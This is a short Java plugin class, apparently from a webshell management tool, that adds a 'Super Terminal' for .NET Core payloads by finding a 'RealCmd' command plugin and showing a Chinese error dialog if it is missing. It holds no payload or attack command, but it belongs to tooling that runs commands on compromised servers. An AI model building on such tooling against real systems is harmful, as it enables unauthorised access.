package shells.plugins.netcore;

import core.annotation.PluginAnnotation;
import core.imp.Plugin;
import core.ui.component.dialog.GOptionPane;
import shells.plugins.generic.RealCmd;
import shells.plugins.generic.SuperTerminal;

@PluginAnnotation(
        payloadName = "NetCoreDynamicPayload",
        Name = "SuperTerminal",
        DisplayName = "\u8d85\u7ea7\u7ec8\u7aef"
)
public class NSuperTerminal extends SuperTerminal {
    public NSuperTerminal() {
    }

    public RealCmd getRealCmd() {
        try {
            Plugin plugin = this.shellEntity.getFrame().getPlugin("RealCmd");
            if (plugin instanceof RealCmd) {
                return (RealCmd) plugin;
            }
        } catch (Throwable t) {
        }
        GOptionPane.showMessageDialog(this.getView(), "\u672a\u627e\u5230 RealCmd \u63d2\u4ef6!", "\u63d0\u793a", 0);
        return null;
    }
}
